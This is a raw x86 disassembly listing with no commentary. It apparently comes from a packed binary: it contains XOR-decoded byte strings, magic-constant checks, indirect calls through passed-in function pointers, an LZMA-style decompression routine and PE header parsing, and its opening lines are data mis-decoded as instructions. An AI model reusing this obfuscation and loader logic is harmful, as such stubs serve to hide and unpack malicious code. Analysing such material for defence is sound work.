  41200d:	rol    BYTE PTR [edx+0x0],0x8
  412011:	rol    BYTE PTR [edx+0x0],0xc
  412015:	rol    BYTE PTR [edx+0x0],0x10
  412019:	rol    BYTE PTR [edx+0x0],0x14
  41201d:	rol    BYTE PTR [edx+0x0],0x18
  412021:	rol    BYTE PTR [edx+0x0],0x1c
  412025:	rol    BYTE PTR [edx+0x0],0x0
  412029:	add    BYTE PTR [eax],al
  41202b:	add    BYTE PTR [eax],al
  41202d:	add    BYTE PTR [eax],al
  41202f:	add    BYTE PTR [edx+0x53],dl
  412032:	inc    esp
  412033:	push   ebx
  412034:	sbb    al,0x3a
  412036:	push   eax
  412037:	(bad)  
  412038:	pop    esi
  412039:	(bad)  
  41203a:	push   cs
  41203b:	inc    eax
  41203c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41203d:	jmp    0x412051
  41203f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412040:	cld    
  412041:	adc    ebp,ebx
  412043:	loopne 0x412046
  412045:	add    BYTE PTR [eax],al
  412047:	add    BYTE PTR [ebx+0x3a],al
  41204a:	pop    esp
  41204b:	inc    ebx
  41204c:	jne    0x4120c0
  41204e:	jb     0x4120b5
  412050:	outs   dx,BYTE PTR ds:[esi]
  412051:	je     0x412097
  412053:	popa   
  412054:	je     0x4120b7
  412056:	pop    esp
  412057:	dec    ebp
  412058:	outs   dx,DWORD PTR ds:[esi]
  412059:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  412061:	ins    BYTE PTR es:[edi],dx
  412062:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  412069:	dec    esi
  41206a:	gs ja  0x41206d
  41206d:	mov    edx,DWORD PTR [ebp-0x14]
  412070:	sub    esp,0xe4
  412076:	push   ebx
  412077:	mov    eax,ebx
  412079:	xchg   ecx,eax
  41207a:	mov    eax,DWORD PTR [ebp+0x8]
  41207d:	cmp    eax,0xf89c85b5
  412082:	jne    0x412416
  412088:	mov    eax,DWORD PTR [ebp+0xc]
  41208b:	cmp    eax,0xf89c85b2
  412090:	jne    0x412416
  412096:	mov    eax,DWORD PTR [ebp+0x24]
  412099:	mov    DWORD PTR [ebp-0x4],eax
  41209c:	mov    BYTE PTR [ebp-0x18],0x3
  4120a0:	mov    BYTE PTR [ebp-0x17],0x1e
  4120a4:	mov    BYTE PTR [ebp-0x16],0x5
  4120a8:	mov    BYTE PTR [ebp-0x15],0x4f
  4120ac:	mov    BYTE PTR [ebp-0x14],0x4c
  4120b0:	mov    BYTE PTR [ebp-0x13],0x7a
  4120b4:	mov    BYTE PTR [ebp-0x20],0xf1
  4120b8:	mov    BYTE PTR [ebp-0x1f],0xf
  4120bc:	mov    BYTE PTR [ebp-0x1e],0x1
  4120c0:	mov    BYTE PTR [ebp-0x1d],0xc
  4120c4:	mov    BYTE PTR [ebp-0x1c],0x4f
  4120c8:	mov    BYTE PTR [ebp-0x1b],0x4c
  4120cc:	mov    BYTE PTR [ebp-0x1a],0x7a
  4120d0:	mov    BYTE PTR [ebp-0x28],0xf
  4120d4:	mov    BYTE PTR [ebp-0x27],0x2
  4120d8:	push   esi
  4120d9:	mov    BYTE PTR [ebp-0x26],0x6
  4120dd:	mov    BYTE PTR [ebp-0x25],0xf3
  4120e1:	push   edi
  4120e2:	mov    BYTE PTR [ebp-0x24],0x1d
  4120e6:	mov    BYTE PTR [ebp-0x23],0xa
  4120ea:	push   0x71
  4120ec:	mov    BYTE PTR [ebp-0x22],0x5
  4120f0:	xor    edi,edi
  4120f2:	mov    BYTE PTR [ebp-0x21],0x7a
  4120f6:	xor    esi,esi
  4120f8:	pop    edx
  4120f9:	mov    eax,0xf5
  4120fe:	lea    ecx,[ebp+esi*1-0x18]
  412102:	movzx  ebx,BYTE PTR [ecx]
  412105:	xor    ebx,edx
  412107:	add    ebx,eax
  412109:	inc    esi
  41210a:	mov    BYTE PTR [ecx],bl
  41210c:	cmp    esi,0x6
  41210f:	jb     0x4120fe
  412111:	xor    esi,esi
  412113:	lea    ecx,[ebp+esi*1-0x20]
  412117:	movzx  ebx,BYTE PTR [ecx]
  41211a:	xor    ebx,edx
  41211c:	add    ebx,eax
  41211e:	inc    esi
  41211f:	mov    BYTE PTR [ecx],bl
  412121:	cmp    esi,0x7
  412124:	jb     0x412113
  412126:	xor    esi,esi
  412128:	lea    ecx,[ebp+esi*1-0x28]
  41212c:	movzx  ebx,BYTE PTR [ecx]
  41212f:	xor    ebx,edx
  412131:	add    ebx,eax
  412133:	push   0x8
  412135:	mov    BYTE PTR [ecx],bl
  412137:	inc    esi
  412138:	pop    ecx
  412139:	cmp    esi,ecx
  41213b:	jb     0x412128
  41213d:	lea    eax,[ebp-0x2c]
  412140:	mov    DWORD PTR [ebp-0x8],eax
  412143:	mov    esi,DWORD PTR [ebp-0x8]
  412146:	mov    eax,0x7113fcef
  41214b:	mov    DWORD PTR [esi],eax
  41214d:	mov    esi,DWORD PTR [ebp-0x2c]
  412150:	cmp    esi,eax
  412152:	jne    0x412162
  412154:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41215b:	mov    DWORD PTR [ebp-0x8],0xf89c85e0
  412162:	mov    eax,DWORD PTR [ebp-0x4]
  412165:	mov    eax,DWORD PTR [eax+0x18c]
  41216b:	cmp    DWORD PTR [eax],edi
  41216d:	jne    0x4123bf
  412173:	mov    eax,DWORD PTR [ebp-0x4]
  412176:	mov    eax,DWORD PTR [eax+0x17c]
  41217c:	mov    DWORD PTR [eax],edi
  41217e:	mov    eax,DWORD PTR [ebp-0x4]
  412181:	mov    eax,DWORD PTR [eax+0x180]
  412187:	mov    DWORD PTR [eax],edi
  412189:	mov    edi,0x4e3d
  41218e:	mov    eax,0x4f8e
  412193:	mov    WORD PTR [ebp-0x78],ax
  412197:	mov    eax,edi
  412199:	mov    WORD PTR [ebp-0x76],ax
  41219d:	add    eax,0x41
  4121a0:	mov    WORD PTR [ebp-0x74],ax
  4121a4:	lea    eax,[edi+0x1]
  4121a7:	mov    WORD PTR [ebp-0x72],ax
  4121ab:	mov    eax,0x4fad
  4121b0:	mov    WORD PTR [ebp-0x70],ax
  4121b4:	lea    eax,[edi-0xc]
  4121b7:	mov    WORD PTR [ebp-0x6e],ax
  4121bb:	add    eax,0x4b
  4121be:	mov    WORD PTR [ebp-0x6c],ax
  4121c2:	lea    eax,[edi-0xa]
  4121c5:	mov    WORD PTR [ebp-0x6a],ax
  4121c9:	mov    eax,edi
  4121cb:	mov    WORD PTR [ebp-0x68],ax
  4121cf:	add    eax,0xfffffff5
  4121d2:	mov    WORD PTR [ebp-0x66],ax
  4121d6:	mov    eax,0x99fe
  4121db:	mov    WORD PTR [ebp-0x64],ax
  4121df:	mov    eax,0x8281
  4121e4:	mov    WORD PTR [ebp-0x62],ax
  4121e8:	mov    eax,0xd78c
  4121ed:	mov    WORD PTR [ebp-0x60],ax
  4121f1:	add    eax,0x14
  4121f4:	mov    WORD PTR [ebp-0x5e],ax
  4121f8:	mov    eax,0x27a3
  4121fd:	mov    WORD PTR [ebp-0x5c],ax
  412201:	mov    eax,0x47a3
  412206:	mov    WORD PTR [ebp-0x5a],ax
  41220a:	lea    eax,[edi-0xd]
  41220d:	mov    WORD PTR [ebp-0x58],ax
  412211:	mov    DWORD PTR [ebp-0x10],0xf306020f
  412218:	mov    DWORD PTR [ebp-0xc],0x7a050a1d
  41221f:	lea    eax,[ebp-0x10]
  412222:	mov    bl,BYTE PTR [eax]
  412224:	xor    bl,dl
  412226:	sub    bl,0xb
  412229:	mov    BYTE PTR [eax],bl
  41222b:	inc    eax
  41222c:	dec    ecx
  41222d:	jne    0x412222
  41222f:	lea    eax,[ebp-0x10]
  412232:	mov    DWORD PTR [ebp-0xb8],eax
  412238:	lea    eax,[ebp-0xbc]
  41223e:	push   eax
  41223f:	mov    eax,DWORD PTR [ebp+0xc]
  412242:	mov    ebx,0x7510896
  412247:	xor    eax,ebx
  412249:	mov    esi,0x3272dd
  41224e:	add    eax,esi
  412250:	push   eax
  412251:	mov    eax,DWORD PTR [ebp-0x4]
  412254:	add    eax,0x66
  412257:	push   eax
  412258:	mov    eax,DWORD PTR [ebp-0x4]
  41225b:	mov    eax,DWORD PTR [eax+0x198]
  412261:	mov    DWORD PTR [ebp-0xbc],0x1
  41226b:	push   DWORD PTR [eax]
  41226d:	mov    eax,DWORD PTR [ebp+0x10]
  412270:	call   eax
  412272:	mov    ecx,DWORD PTR [ebp+0x8]
  412275:	xor    ecx,ebx
  412277:	add    ecx,esi
  412279:	mov    DWORD PTR [ebp-0x8],eax
  41227c:	cmp    eax,ecx
  41227e:	jne    0x412299
  412280:	mov    eax,ds:0x33730bec
  412285:	or     eax,0x22150bef
  41228a:	mov    ds:0x33730bec,eax
  41228f:	add    eax,0x3372e90f
  412294:	mov    ds:0x33730bec,eax
  412299:	mov    ecx,0x4f85
  41229e:	mov    eax,ecx
  4122a0:	mov    WORD PTR [ebp-0x40],ax
  4122a4:	add    eax,0x3
  4122a7:	mov    edx,eax
  4122a9:	mov    WORD PTR [ebp-0x3e],dx
  4122ad:	lea    edx,[ecx+0xb]
  4122b0:	mov    WORD PTR [ebp-0x3c],dx
  4122b4:	add    edx,0x18
  4122b7:	mov    WORD PTR [ebp-0x3a],dx
  4122bb:	lea    edx,[ecx+0x25]
  4122be:	mov    WORD PTR [ebp-0x38],dx
  4122c2:	add    edx,0x5
  4122c5:	mov    WORD PTR [ebp-0x36],dx
  4122c9:	lea    edx,[ecx+0x1f]
  4122cc:	mov    WORD PTR [ebp-0x34],dx
  4122d0:	mov    WORD PTR [ebp-0x32],cx
  4122d4:	mov    ecx,edi
  4122d6:	mov    WORD PTR [ebp-0x30],cx
  4122da:	lea    ecx,[edx+0x1]
  4122dd:	mov    edx,ecx
  4122df:	mov    WORD PTR [ebp-0x54],dx
  4122e3:	mov    edx,eax
  4122e5:	mov    WORD PTR [ebp-0x52],dx
  4122e9:	mov    edx,0x4e70
  4122ee:	mov    WORD PTR [ebp-0x50],dx
  4122f2:	mov    WORD PTR [ebp-0x4e],ax
  4122f6:	lea    eax,[ecx-0x1b]
  4122f9:	mov    WORD PTR [ebp-0x4c],ax
  4122fd:	add    eax,0x5
  412300:	mov    WORD PTR [ebp-0x4a],ax
  412304:	lea    eax,[ecx-0x21]
  412307:	mov    WORD PTR [ebp-0x48],ax
  41230b:	mov    WORD PTR [ebp-0x46],cx
  41230f:	mov    WORD PTR [ebp-0x44],di
  412313:	mov    eax,DWORD PTR [ebp+0x8]
  412316:	movzx  ecx,WORD PTR [ebp-0x54]
  41231a:	xor    eax,ebx
  41231c:	add    eax,esi
  41231e:	xor    eax,ecx
  412320:	mov    WORD PTR [ebp-0x54],ax
  412324:	mov    eax,DWORD PTR [ebp+0x8]
  412327:	movzx  ecx,WORD PTR [ebp-0x40]
  41232b:	xor    eax,ebx
  41232d:	add    eax,esi
  41232f:	xor    eax,ecx
  412331:	mov    WORD PTR [ebp-0x40],ax
  412335:	xor    eax,eax
  412337:	mov    WORD PTR [ebp-0xd0],ax
  41233e:	mov    WORD PTR [ebp-0xe4],ax
  412345:	mov    edi,DWORD PTR [ebp+0x24]
  412348:	lea    eax,[ebp-0xd0]
  41234e:	lea    edx,[ebp-0x54]
  412351:	mov    DWORD PTR [ebp-0xbc],0x2
  41235b:	mov    DWORD PTR [ebp-0xb8],eax
  412361:	call   0x414b33
  412366:	mov    DWORD PTR [ebp-0xb4],eax
  41236c:	lea    eax,[ebp-0xbc]
  412372:	push   eax
  412373:	mov    eax,DWORD PTR [ebp+0xc]
  412376:	xor    eax,ebx
  412378:	add    eax,esi
  41237a:	push   eax
  41237b:	lea    eax,[ebp-0x78]
  41237e:	push   eax
  41237f:	push   DWORD PTR [ebp-0x8]
  412382:	mov    eax,DWORD PTR [ebp+0x10]
  412385:	call   eax
  412387:	mov    edi,DWORD PTR [ebp+0x24]
  41238a:	lea    eax,[ebp-0xe4]
  412390:	lea    edx,[ebp-0x40]
  412393:	mov    DWORD PTR [ebp-0xb8],eax
  412399:	call   0x414b33
  41239e:	mov    DWORD PTR [ebp-0xb4],eax
  4123a4:	lea    eax,[ebp-0xbc]
  4123aa:	push   eax
  4123ab:	mov    eax,DWORD PTR [ebp+0xc]
  4123ae:	xor    eax,ebx
  4123b0:	add    eax,esi
  4123b2:	push   eax
  4123b3:	lea    eax,[ebp-0x78]
  4123b6:	push   eax
  4123b7:	push   DWORD PTR [ebp-0x8]
  4123ba:	mov    eax,DWORD PTR [ebp+0x10]
  4123bd:	call   eax
  4123bf:	mov    eax,DWORD PTR [ebp+0x14]
  4123c2:	push   DWORD PTR [ebp-0x4]
  4123c5:	push   DWORD PTR [ebp+0x20]
  4123c8:	push   DWORD PTR [ebp+0x1c]
  4123cb:	push   DWORD PTR [ebp+0x18]
  4123ce:	push   DWORD PTR [ebp+0x10]
  4123d1:	push   DWORD PTR [ebp+0x8]
  4123d4:	push   DWORD PTR [ebp+0xc]
  4123d7:	call   0x4133d7
  4123dc:	add    DWORD PTR [ebp-0x4],eax
  4123df:	mov    eax,DWORD PTR [ebp-0x4]
  4123e2:	mov    eax,DWORD PTR [ebp-0x4]
  4123e5:	mov    edi,DWORD PTR [eax+0x190]
  4123eb:	mov    eax,DWORD PTR [ebp-0x4]
  4123ee:	mov    eax,DWORD PTR [eax+0x18c]
  4123f4:	mov    esi,DWORD PTR [eax]
  4123f6:	lea    ecx,[ebp+0x4]
  4123f9:	mov    edx,DWORD PTR [ecx]
  4123fb:	cmp    edx,esi
  4123fd:	jb     0x412414
  4123ff:	mov    eax,DWORD PTR [edi]
  412401:	mov    edi,DWORD PTR [eax+0x3c]
  412404:	mov    edi,DWORD PTR [edi+eax*1+0x50]
  412408:	add    edi,esi
  41240a:	cmp    edx,edi
  41240c:	jae    0x412414
  41240e:	sub    eax,esi
  412410:	add    eax,edx
  412412:	mov    DWORD PTR [ecx],eax
  412414:	pop    edi
  412415:	pop    esi
  412416:	pop    ebx
  412417:	leave  
  412418:	ret    0x20
  41241b:	push   edi
  41241c:	push   esi
  41241d:	push   ebx
  41241e:	push   ebp
  41241f:	mov    ebp,esp
  412421:	mov    eax,DWORD PTR [ebp+0x24]
  412424:	add    DWORD PTR [ebp+0x28],eax
  412427:	push   eax
  412428:	cld    
  412429:	mov    esi,DWORD PTR [ebp+0x18]
  41242c:	add    DWORD PTR [ebp+0x1c],esi
  41242f:	push   esi
  412430:	mov    esi,DWORD PTR [ebp+0x14]
  412433:	lods   eax,DWORD PTR ds:[esi]
  412434:	xchg   edx,eax
  412435:	push   edx
  412436:	mov    cl,BYTE PTR [esi-0x2]
  412439:	or     eax,0xffffffff
  41243c:	shl    eax,cl
  41243e:	not    eax
  412440:	push   eax
  412441:	mov    cl,dh
  412443:	or     eax,0xffffffff
  412446:	shl    eax,cl
  412448:	not    eax
  41244a:	push   eax
  41244b:	add    cl,dl
  41244d:	mov    edi,esi
  41244f:	sub    esp,0xc
  412452:	sub    eax,eax
  412454:	inc    eax
  412455:	push   eax
  412456:	push   eax
  412457:	push   eax
  412458:	push   eax
  412459:	push   eax
  41245a:	push   edi
  41245b:	sub    esi,esi
  41245d:	push   esi
  41245e:	or     ebx,0xffffffff
  412461:	mov    eax,0x300
  412466:	shl    eax,cl
  412468:	lea    ecx,[eax+0x736]
  41246e:	mov    eax,0x4000400
  412473:	shr    ecx,1
  412475:	rep stos DWORD PTR es:[edi],eax
  412477:	push   0x5
  412479:	pop    ecx
  41247a:	call   0x412765
  41247f:	loop   0x41247a
  412481:	lea    esi,[esi]
  412483:	lea    edi,[edi]
  412485:	mov    edi,DWORD PTR [ebp-0x4]
  412488:	mov    eax,DWORD PTR [ebp-0x10]
  41248b:	sub    edi,DWORD PTR [ebp+0x24]
  41248e:	and    eax,edi
  412490:	mov    DWORD PTR [ebp-0x18],eax
  412493:	mov    al,0x0
  412495:	call   0x41277d
  41249a:	jne    0x412535
  4124a0:	mov    cl,BYTE PTR [ebp-0xc]
  4124a3:	and    edi,DWORD PTR [ebp-0x14]
  4124a6:	shl    edi,cl
  4124a8:	sub    cl,0x8
  4124ab:	neg    cl
  4124ad:	shr    esi,cl
  4124af:	pop    eax
  4124b0:	add    edi,esi
  4124b2:	pop    esi
  4124b3:	lea    edi,[edi+edi*2]
  4124b6:	shl    edi,0x8
  4124b9:	cmp    al,0x7
  4124bb:	pop    edx
  4124bc:	lea    ecx,[esi+edi*2+0xe6c]
  4124c3:	push   ecx
  4124c4:	push   esi
  4124c5:	mov    esi,0x100
  4124ca:	push   eax
  4124cb:	mov    al,0x1
  4124cd:	jb     0x412503
  4124cf:	mov    edi,DWORD PTR [ebp-0x4]
  4124d2:	sub    edi,DWORD PTR [ebp-0x24]
  4124d5:	movzx  edi,BYTE PTR [edi]
  4124d8:	mov    ebp,DWORD PTR [ebp-0x34]
  4124db:	shl    edi,1
  4124dd:	mov    ecx,esi
  4124df:	and    esi,edi
  4124e1:	add    ecx,esi
  4124e3:	lea    ebp,[ebp+ecx*2+0x0]
  4124e7:	call   0x41279c
  4124ec:	mov    ecx,eax
  4124ee:	shr    esi,0x8
  4124f1:	and    ecx,0x1
  4124f4:	cmp    esi,ecx
  4124f6:	mov    esi,0x100
  4124fb:	jne    0x41250b
  4124fd:	cmp    eax,esi
  4124ff:	jb     0x4124d8
  412501:	jmp    0x412517
  412503:	mov    ebp,DWORD PTR [ebp-0x34]
  412506:	call   0x41279c
  41250b:	inc    eax
  41250c:	inc    esi
  41250d:	sub    eax,0x1
  412510:	sub    esi,0x1
  412513:	cmp    eax,esi
  412515:	jb     0x412503
  412517:	pop    edx
  412518:	inc    edx
  412519:	cmp    edx,0x5
  41251c:	dec    edx
  41251d:	mov    ecx,edx
  41251f:	jb     0x412530
  412521:	inc    edx
  412522:	cmp    edx,0xb
  412525:	dec    edx
  412526:	mov    cl,0x4
  412528:	dec    cl
  41252a:	jb     0x412530
  41252c:	mov    cl,0x7
  41252e:	dec    cl
  412530:	sub    edx,ecx
  412532:	push   edx
  412533:	jmp    0x412584
  412535:	mov    al,0xc1
  412537:	dec    al
  412539:	call   0x41278d
  41253e:	jne    0x412554
  412540:	pop    eax
  412541:	pop    edi
  412542:	pop    edx
  412543:	pop    ecx
  412544:	pop    edx
  412545:	pop    ecx
  412546:	push   DWORD PTR [esp]
  412549:	push   ecx
  41254a:	push   edx
  41254b:	mov    edx,0x664
  412550:	mov    cl,0x0
  412552:	jmp    0x4125c7
  412554:	mov    al,0xcd
  412556:	dec    al
  412558:	call   0x41278d
  41255d:	jne    0x41258d
  41255f:	mov    al,0xf1
  412561:	dec    al
  412563:	call   0x41277d
  412568:	jne    0x4125bd
  41256a:	pop    eax
  41256b:	cmp    al,0x7
  41256d:	mov    al,0x9
  41256f:	jb     0x412573
  412571:	mov    al,0xb
  412573:	push   eax
  412574:	mov    esi,DWORD PTR [ebp-0x4]
  412577:	sub    esi,DWORD PTR [ebp-0x24]
  41257a:	cmp    esi,DWORD PTR [ebp+0x24]
  41257d:	jb     0x412754
  412583:	lods   al,BYTE PTR ds:[esi]
  412584:	mov    edi,DWORD PTR [ebp-0x4]
  412587:	stos   BYTE PTR es:[edi],al
  412588:	jmp    0x41271b
  41258d:	mov    al,0xd8
  41258f:	call   0x41278d
  412594:	mov    esi,DWORD PTR [ebp-0x28]
  412597:	je     0x4125b4
  412599:	mov    al,0xe4
  41259b:	call   0x41278d
  4125a0:	mov    esi,DWORD PTR [ebp-0x2c]
  4125a3:	je     0x4125ae
  4125a5:	mov    esi,DWORD PTR [ebp-0x30]
  4125a8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4125ab:	mov    DWORD PTR [ebp-0x30],ecx
  4125ae:	mov    ecx,DWORD PTR [ebp-0x28]
  4125b1:	mov    DWORD PTR [ebp-0x2c],ecx
  4125b4:	mov    ecx,DWORD PTR [ebp-0x24]
  4125b7:	mov    DWORD PTR [ebp-0x28],ecx
  4125ba:	mov    DWORD PTR [ebp-0x24],esi
  4125bd:	pop    eax
  4125be:	pop    edi
  4125bf:	pop    ecx
  4125c0:	mov    edx,0xa68
  4125c5:	mov    cl,0x8
  4125c7:	add    edx,edi
  4125c9:	push   edx
  4125ca:	push   edi
  4125cb:	cmp    al,0x7
  4125cd:	mov    al,cl
  4125cf:	jb     0x4125d3
  4125d1:	add    al,0x3
  4125d3:	push   eax
  4125d4:	mov    ebp,DWORD PTR [ebp-0x34]
  4125d7:	call   0x41279a
  4125dc:	jne    0x4125f2
  4125de:	mov    eax,DWORD PTR [ebp-0x18]
  4125e1:	mov    edi,DWORD PTR [ebp-0x34]
  4125e4:	shl    eax,0x3
  4125e7:	sub    ecx,ecx
  4125e9:	push   0x8
  4125eb:	pop    esi
  4125ec:	lea    edi,[edi+eax*2+0x4]
  4125f0:	jmp    0x412627
  4125f2:	mov    ebp,DWORD PTR [ebp-0x34]
  4125f5:	add    ebp,0x2
  4125f8:	call   0x41279a
  4125fd:	jne    0x412617
  4125ff:	mov    eax,DWORD PTR [ebp-0x18]
  412602:	mov    edi,DWORD PTR [ebp-0x34]
  412605:	shl    eax,0x3
  412608:	push   0x8
  41260a:	pop    ecx
  41260b:	push   0x8
  41260d:	pop    esi
  41260e:	lea    edi,[edi+eax*2+0x104]
  412615:	jmp    0x412627
  412617:	mov    edi,0x204
  41261c:	add    edi,DWORD PTR [ebp-0x34]
  41261f:	push   0x10
  412621:	pop    ecx
  412622:	mov    esi,0x100
  412627:	mov    DWORD PTR [ebp-0x1c],ecx
  41262a:	sub    eax,eax
  41262c:	inc    eax
  41262d:	mov    ebp,edi
  41262f:	call   0x41279c
  412634:	mov    ecx,eax
  412636:	sub    ecx,esi
  412638:	jb     0x41262d
  41263a:	add    DWORD PTR [ebp-0x1c],ecx
  41263d:	cmp    DWORD PTR [ebp-0x3c],0x4
  412641:	jae    0x4126f7
  412647:	add    DWORD PTR [ebp-0x3c],0x7
  41264b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41264e:	cmp    ecx,0x4
  412651:	jb     0x412656
  412653:	push   0x3
  412655:	pop    ecx
  412656:	mov    edi,DWORD PTR [ebp-0x38]
  412659:	shl    ecx,0x6
  41265c:	sub    eax,eax
  41265e:	inc    eax
  41265f:	push   0x40
  412661:	pop    esi
  412662:	lea    edi,[edi+ecx*2+0x360]
  412669:	mov    ebp,edi
  41266b:	call   0x41279c
  412670:	mov    ecx,eax
  412672:	sub    ecx,esi
  412674:	jb     0x412669
  412676:	mov    DWORD PTR [ebp-0x18],ecx
  412679:	mov    DWORD PTR [ebp-0x24],ecx
  41267c:	cmp    ecx,0x4
  41267f:	jb     0x4126f4
  412681:	mov    esi,ecx
  412683:	and    DWORD PTR [ebp-0x24],0x1
  412687:	shr    esi,1
  412689:	or     DWORD PTR [ebp-0x24],0x2
  41268d:	dec    esi
  41268e:	cmp    ecx,0xe
  412691:	jae    0x4126ac
  412693:	mov    eax,0x2af
  412698:	sub    eax,ecx
  41269a:	mov    ecx,esi
  41269c:	shl    BYTE PTR [ebp-0x24],cl
  41269f:	add    eax,DWORD PTR [ebp-0x24]
  4126a2:	shl    eax,1
  4126a4:	add    eax,DWORD PTR [ebp-0x38]
  4126a7:	mov    DWORD PTR [ebp-0x34],eax
  4126aa:	jmp    0x4126d9
  4126ac:	sub    esi,0x4
  4126af:	call   0x412759
  4126b4:	shr    ebx,1
  4126b6:	shl    DWORD PTR [ebp-0x24],1
  4126b9:	cmp    DWORD PTR [ebp-0x20],ebx
  4126bc:	jb     0x4126c4
  4126be:	inc    DWORD PTR [ebp-0x24]
  4126c1:	sub    DWORD PTR [ebp-0x20],ebx
  4126c4:	dec    esi
  4126c5:	jne    0x4126af
  4126c7:	mov    eax,0x644
  4126cc:	add    eax,DWORD PTR [ebp-0x38]
  4126cf:	mov    DWORD PTR [ebp-0x34],eax
  4126d2:	shl    DWORD PTR [ebp-0x24],0x4
  4126d6:	push   0x4
  4126d8:	pop    esi
  4126d9:	sub    edi,edi
  4126db:	inc    edi
  4126dc:	mov    eax,edi
  4126de:	mov    ebp,DWORD PTR [ebp-0x34]
  4126e1:	call   0x41279c
  4126e6:	test   al,0x1
  4126e8:	je     0x4126ed
  4126ea:	or     DWORD PTR [ebp-0x24],edi
  4126ed:	shl    edi,1
  4126ef:	dec    esi
  4126f0:	jne    0x4126de
  4126f2:	jmp    0x4126f4
  4126f4:	inc    DWORD PTR [ebp-0x24]
  4126f7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4126fa:	add    ecx,0x2
  4126fd:	mov    edi,DWORD PTR [ebp-0x4]
  412700:	mov    eax,edi
  412702:	sub    eax,DWORD PTR [ebp+0x24]
  412705:	cmp    DWORD PTR [ebp-0x24],eax
  412708:	ja     0x412754
  41270a:	mov    esi,edi
  41270c:	sub    esi,DWORD PTR [ebp-0x24]
  41270f:	mov    edx,DWORD PTR [ebp+0x28]
  412712:	lods   al,BYTE PTR ds:[esi]
  412713:	stos   BYTE PTR es:[edi],al
  412714:	cmp    edi,edx
  412716:	jae    0x41271b
  412718:	dec    ecx
  412719:	jne    0x412712
  41271b:	mov    DWORD PTR [ebp-0x4],edi
  41271e:	movzx  esi,al
  412721:	cmp    edi,DWORD PTR [ebp+0x28]
  412724:	jb     0x412485
  41272a:	call   0x412759
  41272f:	sub    eax,eax
  412731:	lea    ebp,[esp+0x3c]
  412735:	mov    edx,DWORD PTR [ebp+0x20]
  412738:	mov    esi,DWORD PTR [ebp-0x8]
  41273b:	sub    esi,DWORD PTR [ebp+0x18]
  41273e:	mov    DWORD PTR [edx],esi
  412740:	mov    edx,DWORD PTR [ebp+0x2c]
  412743:	mov    edi,DWORD PTR [ebp-0x4]
  412746:	sub    edi,DWORD PTR [ebp+0x24]
  412749:	mov    DWORD PTR [edx],edi
  41274b:	leave  
  41274c:	pop    ebx
  41274d:	pop    esi
  41274e:	pop    edi
  41274f:	ret    0x1c
  412752:	pop    esi
  412753:	pop    eax
  412754:	sub    eax,eax
  412756:	inc    eax
  412757:	jmp    0x412731
  412759:	cmp    ebx,0x1000000
  41275f:	jb     0x412762
  412761:	ret    
  412762:	shl    ebx,0x8
  412765:	push   esi
  412766:	mov    esi,DWORD PTR [ebp-0x8]
  412769:	cmp    esi,DWORD PTR [ebp+0x1c]
  41276c:	jae    0x412752
  41276e:	mov    eax,DWORD PTR [ebp-0x20]
  412771:	shl    eax,0x8
  412774:	lods   al,BYTE PTR ds:[esi]
  412775:	mov    DWORD PTR [ebp-0x20],eax
  412778:	mov    DWORD PTR [ebp-0x8],esi
  41277b:	pop    esi
  41277c:	ret    
  41277d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412780:	movzx  eax,al
  412783:	shl    ecx,0x4
  412786:	add    eax,DWORD PTR [ebp-0x18]
  412789:	add    eax,ecx
  41278b:	jmp    0x412793
  41278d:	movzx  eax,al
  412790:	add    eax,DWORD PTR [ebp-0x3c]
  412793:	mov    ebp,DWORD PTR [ebp-0x38]
  412796:	lea    ebp,[ebp+eax*2+0x0]
  41279a:	sub    eax,eax
  41279c:	lea    ebp,[ebp+eax*2+0x0]
  4127a0:	cmp    ebx,0x1000000
  4127a6:	jae    0x4127c4
  4127a8:	mov    ecx,DWORD PTR [esp+0x38]
  4127ac:	shl    DWORD PTR [esp+0x20],0x8
  4127b1:	cmp    ecx,DWORD PTR [esp+0x5c]
  4127b5:	jae    0x412753
  4127b7:	mov    dl,BYTE PTR [ecx]
  4127b9:	inc    DWORD PTR [esp+0x38]
  4127bd:	shl    ebx,0x8
  4127c0:	mov    BYTE PTR [esp+0x20],dl
  4127c4:	mov    ecx,ebx
  4127c6:	movzx  edx,WORD PTR [ebp+0x0]
  4127ca:	shr    ecx,0xb
  4127cd:	imul   ecx,edx
  4127d0:	cmp    DWORD PTR [esp+0x20],ecx
  4127d4:	jae    0x4127ed
  4127d6:	mov    ebx,ecx
  4127d8:	mov    ecx,0x800
  4127dd:	sub    ecx,edx
  4127df:	shr    ecx,0x5
  4127e2:	add    WORD PTR [ebp+0x0],cx
  4127e6:	add    eax,eax
  4127e8:	lea    ebp,[esp+0x40]
  4127ec:	ret    
  4127ed:	shr    edx,0x5
  4127f0:	sub    DWORD PTR [esp+0x20],ecx
  4127f4:	sub    ebx,ecx
  4127f6:	sub    WORD PTR [ebp+0x0],dx
  4127fa:	add    eax,eax
  4127fc:	add    eax,0x1
  4127ff:	lea    ebp,[esp+0x40]
  412803:	ret    
  412804:	push   ebp
  412805:	mov    ebp,esp
  412807:	sub    esp,0xec
  41280d:	push   ebx
  41280e:	push   esi
  41280f:	push   edi
  412810:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  412817:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  41281e:	mov    eax,DWORD PTR [ebp+0x8]
  412821:	mov    DWORD PTR [ebp+0x8],eax
  412824:	mov    ecx,DWORD PTR [ebp-0x8]
  412827:	mov    ebx,0x7510896
  41282c:	xor    ecx,ebx
  41282e:	mov    eax,0x3272dd
  412833:	add    ecx,eax
  412835:	mov    DWORD PTR [ebp-0x20],ecx
  412838:	mov    ecx,DWORD PTR [ebp-0x8]
  41283b:	xor    ecx,ebx
  41283d:	add    ecx,eax
  41283f:	mov    DWORD PTR [ebp-0x30],ecx
  412842:	mov    ecx,DWORD PTR [ebp-0x8]
  412845:	xor    ecx,ebx
  412847:	add    ecx,eax
  412849:	mov    DWORD PTR [ebp-0x2c],ecx
  41284c:	mov    ecx,DWORD PTR [ebp-0x8]
  41284f:	xor    ecx,ebx
  412851:	add    ecx,eax
  412853:	mov    DWORD PTR [ebp-0xa0],ecx
  412859:	mov    DWORD PTR [ebp-0x48],0xf89f05b5
